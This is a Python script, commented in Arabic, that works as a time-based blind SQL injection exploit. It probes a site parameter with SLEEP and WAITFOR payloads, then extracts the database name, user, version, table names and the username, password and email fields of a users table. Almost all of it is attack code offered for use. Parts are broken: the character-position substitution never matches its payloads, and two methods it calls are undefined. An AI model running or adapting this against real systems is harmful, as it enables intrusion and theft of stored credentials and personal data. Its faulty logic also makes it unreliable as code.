#!/usr/bin/env python3
import requests
import time
import sys
from urllib.parse import quote

class SQLiExploiter:
    def __init__(self, target_url, vulnerable_param):
        self.target_url = target_url
        self.param = vulnerable_param
        self.session = requests.Session()
        
    def test_vulnerability(self):
        """اختبار وجود الثغرة"""
        payloads = [
            f"' WAITFOR DELAY '0:0:5'--",
            f"' OR SLEEP(5)--",
            f"'; SELECT pg_sleep(5)--"
        ]
        
        for payload in payloads:
            start_time = time.time()
            params = {self.param: payload}
            try:
                response = self.session.get(self.target_url, params=params, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed >= 4.5:  # تأخير ملحوظ
                    print(f"[+] ثغرة مؤكدة! التأخير: {elapsed:.2f} ثانية")
                    print(f"[+] Payload الناجح: {payload}")
                    return True
            except:
                pass
        return False
    
    def extract_database_info(self):
        """استخراج معلومات قاعدة البيانات"""
        print("[*] بدء استخراج معلومات DB...")
        
        # استخراج اسم قاعدة البيانات
        db_name = self.extract_via_time("' AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(5),0)--")
        print(f"[+] اسم قاعدة البيانات: {db_name}")
        
        # استخراج اسم المستخدم
        db_user = self.extract_via_time("' AND IF(SUBSTRING(CURRENT_USER(),1,1)='a',SLEEP(5),0)--")
        print(f"[+] مستخدم DB: {db_user}")
        
        # استخراج الإصدار
        db_version = self.extract_via_time("' AND IF(SUBSTRING(@@version,1,1)='a',SLEEP(5),0)--")
        print(f"[+] إصدار DB: {db_version}")
        
        return db_name, db_user, db_version
    
    def extract_via_time(self, base_payload):
        """استخراج البيانات حرفاً حرفاً باستخدام Time-Based"""
        result = ""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        
        for position in range(1, 50):
            char_found = False
            for char in chars:
                payload = base_payload.replace("SUBSTRING(...,1,1)", f"SUBSTRING(...,{position},1)")
                payload = payload.replace("='a'", f"='{char}'")
                
                start_time = time.time()
                params = {self.param: payload}
                
                try:
                    response = self.session.get(self.target_url, params=params, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 4.5:
                        result += char
                        print(f"[+] حرف {position}: {char}")
                        char_found = True
                        break
                except:
                    continue
            
            if not char_found:
                break
        
        return result
    
    def extract_table_names(self, db_name):
        """استخراج أسماء الجداول"""
        print(f"[*] استخراج الجداول من {db_name}...")
        
        # Query لاستخراج الجداول (MySQL مثال)
        tables = []
        for i in range(1, 20):
            table_name = ""
            for pos in range(1, 30):
                payload = f"' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i-1},1),{pos},1))=0,SLEEP(0),SLEEP(5))--"
                
                start_time = time.time()
                params = {self.param: payload}
                
                try:
                    response = self.session.get(self.target_url, params=params, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 4.5:
                        # استخراج الحرف عبر ASCII
                        for ascii_val in range(32, 127):
                            payload = f"' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {i-1},1),{pos},1))={ascii_val},SLEEP(5),0)--"
                            
                            start_time = time.time()
                            params = {self.param: payload}
                            response = self.session.get(self.target_url, params=params, timeout=10)
                            elapsed = time.time() - start_time
                            
                            if elapsed >= 4.5:
                                table_name += chr(ascii_val)
                                break
                except:
                    continue
            
            if table_name:
                tables.append(table_name)
                print(f"[+] جدول {i}: {table_name}")
            else:
                break
        
        return tables
    
    def extract_data_from_table(self, db_name, table_name, columns=None):
        """استخراج البيانات من جدول محدد"""
        print(f"[*] استخراج البيانات من {table_name}...")
        
        if not columns:
            # اكتشاف الأعمدة أولاً
            columns = self.extract_columns(db_name, table_name)
        
        for column in columns:
            print(f"\n[*] استخراج بيانات العمود: {column}")
            for row in range(1, 100):
                data = self.extract_cell_data(db_name, table_name, column, row)
                if data:
                    print(f"[+] صف {row}: {data}")
                else:
                    break

# الاستخدام
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("الاستخدام: python3 exploit.py <URL> <parameter>")
        print("مثال: python3 exploit.py http://example.com/page.php page")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    exploiter = SQLiExploiter(url, param)
    
    if exploiter.test_vulnerability():
        print("[+] النظام معرض للثغرة!")
        
        # استخراج المعلومات الأساسية
        db_name, db_user, version = exploiter.extract_database_info()
        
        # استخراج أسماء الجداول
        tables = exploiter.extract_table_names(db_name)
        
        if tables:
            # استخراج البيانات من جدول معين (مثلاً users)
            if 'users' in tables or 'user' in tables:
                exploiter.extract_data_from_table(db_name, 'users', ['username', 'password', 'email'])
    else:
        print("[-] النظام غير معرض للثغرة أو يحتاج payloads مختلفة")